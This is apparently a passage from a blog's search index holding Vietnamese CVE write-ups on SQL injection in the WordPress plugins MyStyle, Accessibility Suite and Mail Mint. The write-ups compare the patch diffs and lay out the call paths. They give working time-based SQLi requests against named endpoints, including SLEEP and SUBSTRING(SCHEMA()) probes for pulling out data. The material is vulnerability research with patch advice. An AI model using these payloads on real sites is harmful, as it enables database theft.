duy·ªát.\nPh√≠a tr√™n hook template_redirect trong __construct c√≤n c√≥ hook init, n√≥ s·∫Ω ch·∫°y tr√™n m·ªói request v·ªõi callback rewrite_rules:\npublic function rewrite_rules() { // Flush rewrite rules for newly created rewrites. flush_rewrite_rules(); add_rewrite_rule( \u0026#39;designs/([a-zA-Z0-9_-].+)?$\u0026#39;, // designs/{slug} \u0026#39;index.php?pagename=designs\u0026amp;design_id=$matches[1]\u0026#39;, \u0026#39;top\u0026#39; ); } H√†m n√†y th√™m route /designs/{id} ƒë·ªÉ load trang designs v√† truy·ªÅn bi·∫øn design_id.\nüëâ Nh∆∞ v·∫≠y khi truy c·∫≠p v√†o /designs/:\nCallback rewrite_rules ƒë∆∞·ª£c g·ªçi, WordPress s·∫Ω load /index.php?pagename=designs\u0026amp;design_id=. design_id kh√¥ng c√≥ gi√° tr·ªã n√™n get_design_id_from_url ƒë∆∞·ª£c g√°n cho $design_id s·∫Ω l√† false =\u0026gt; ƒëi·ªÅu ki·ªán false === $design_id x·∫£y ra khi·∫øn init_index_request trong kh·ªëi if ƒë∆∞·ª£c g·ªçi. init_index_request g·ªçi ƒë·∫øn get_designs get_designs l·∫•y tr·ª±c ti·∫øp orderby t·ª´ GET request th√™m v√†o c√¢u query ƒë·ªÉ th·ª±c thi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nTrong tr∆∞·ªùng h·ª£p n√†y kh√¥ng n√™n comment ph√≠a sau SLEEP. V√¨ developer ƒë√£ enter khi·∫øn OFFSET xu·ªëng d√≤ng th·ª© 2, khi comment ho·∫°t ƒë·ªông, parser c·ªßa SQL s·∫Ω x·ª≠ l√Ω v√† tr·∫£ v·ªÅ l·ªói. {: .prompt-info }\nCu·ªói c√πng s·∫Ω ƒë∆∞·ª£c t√°ch th√†nh 2 c√¢u query ·ªü 2 d√≤ng kh√°c nhau g√¢y ra l·ªói:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25\tOFFSET 0 Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ orderby ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-48281 trong plugin WordPress MyStyle Custom Product Designer tr∆∞·ªõc phi√™n b·∫£n 3.21.2 xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai white list, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress MyStyle Custom Product Designer Plugin \u0026lt;= 3.21.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-48281/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.21.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48281\"\u003eCVE-2025-48281\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mystyle-custom-product-designer\"\u003eWordPress MyStyle Custom Product Designer Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.21.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e:  v3.21.1(vul) v√† v3.21.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eMyStyle Custom Product Designer Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48281"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Accessibility Suite c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.19. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Accessibility Suite: v4.18(vul) v√† v4.19(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho input v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng prepare() ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/classes/Helper.php\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $list = json_decode( $wpdb-\u0026gt;get_results($wpdb-\u0026gt;prepare(\u0026#34;SELECT list FROM $table_name WHERE scan_id = $scan_id\u0026#34;))[0]-\u0026gt;list // phpcs:ignore ); } {: file=\u0026ldquo;includes/classes/Helper.php v4.18\u0026rdquo; }\nB·∫£n v√° ƒë√£ truy·ªÅn $scan_id nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa.\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\u0026#34;status\u0026#34; =\u0026gt; \u0026#34;failed\u0026#34;, \u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;Invalid scan ID\u0026#34;]; } // Get list using properly prepared query $query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT list FROM %i WHERE scan_id = %d\u0026#34;, $table_name, $scan_id ); $result = $wpdb-\u0026gt;get_results($query); } {: file=\u0026ldquo;includes/classes/Helper.php v4.19\u0026rdquo; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh save_false_positive c·ªßa class Helper thu·ªôc file includes/classes/Helper.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a save_false_positive trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ save_false_positive ƒë∆∞·ª£c callback c·ªßa action hook wp_ajax_ONLINE_ADAv4/save_false_positive g·ªçi.\nKhi POST request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=ONLINE_ADAv4/save_false_positive callback ƒë∆∞·ª£c g·ªçi. Trong request c·∫ßn 2 POST param issue_id v√† scan_id. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ:\n{\u0026#34;status\u0026#34;:\u0026#34;failed\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;Did not receive the scan ID or the issue ID\u0026#34;} save_false_positive ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë issue_id v√† scan_id. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi magic quotes trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ POST request.\n·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng.\nif(! is_admin()) { return \u0026#39;\u0026#39;; } Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi.\nExploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi role:subcriber c√≥ privilege th·∫•p nh·∫•t.\nTrong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ privilege role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user subcriber g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT SLEEP(5) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh\nSELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, scan_id s·∫Ω b·ªã escape.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-32650 trong plugin WordPress Accessibility Suite tr∆∞·ªõc phi√™n b·∫£n 4.19 xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m $wpdb-\u0026gt;prepare() d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Accessibility Suite Plugin \u0026lt;= 4.18 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-32650/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAccessibility Suite\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.19\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-32650\"\u003eCVE-2025-32650\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/online-accessibility/\"\u003eWordPress Accessibility Suite Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 4.18\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccessibility Suite\u003c/strong\u003e:  v4.18(vul) v√† v4.19(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho \u003cstrong\u003einput\u003c/strong\u003e v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng \u003ccode\u003eprepare()\u003c/code\u003e ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\u003c/p\u003e","title":"CVE-2025-32650"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress and Debugging Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;)\u0026#34;; $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;) GROUP BY user_id LIMIT $number OFFSET $offset\u0026#34;; $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.5\u0026quot; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders)\u0026#34;, $keys ); $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026amp; OFFSET (safe with prepare) $final_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\u0026#34;, array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.6\u0026quot; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin.\nK·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong:\nretrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php.\nTi·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin.\nH√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php.\nTi·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u:\nTa ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress:\nclass ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u0026gt;namespace, // mrm/v1 $this-\u0026gt;rest_base . \u0026#39;/learndash/map\u0026#39;, // contacts/import/learndash/map/ array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::CREATABLE, // POST \u0026#39;callback\u0026#39; =\u0026gt; array( $this-\u0026gt;controller, \u0026#39;map_contacts_with_learndash\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; PermissionManager::current_user_can(\u0026#39;mint_manage_contacts\u0026#39;), // Admin \u0026#39;args\u0026#39; =\u0026gt; array( \u0026#39;selectedCourses\u0026#39; =\u0026gt; array( \u0026#39;description\u0026#39; =\u0026gt; __( \u0026#39;The selected courses from which to import contacts.\u0026#39;, \u0026#39;mrm\u0026#39; ), \u0026#39;required\u0026#39; =\u0026gt; true, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;array\u0026#39;, \u0026#39;sanitize_callback\u0026#39; =\u0026gt; \u0026#39;rest_sanitize_array\u0026#39;, ) ), // array + required ), ) ); // other logic } // other logic } Lu·ªìng g·ªçi h√†m:\nPOST /wp-json/mrm/v1/contacts/import/learndash/map ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) l√† callback ƒë∆∞·ª£c g·ªçi: Nh·∫≠n $request l√†m tham s·ªë ƒë·∫ßu v√†o. L·∫•y c√°c tham s·ªë c·ªßa $request chuy·ªÉn th√†nh m·∫£ng $params Callback g·ªçi retrieve_contacts_associated_with_learndash() v·ªõi ƒë·ªëi s·ªë l√† $params. retrieve_contacts_associated_with_learndash() g·ªçi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã value trong $courses, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u course_{COURSE_ID}_access_from Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng $keys ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m implode(). N·∫øu $keys ch·ªâ 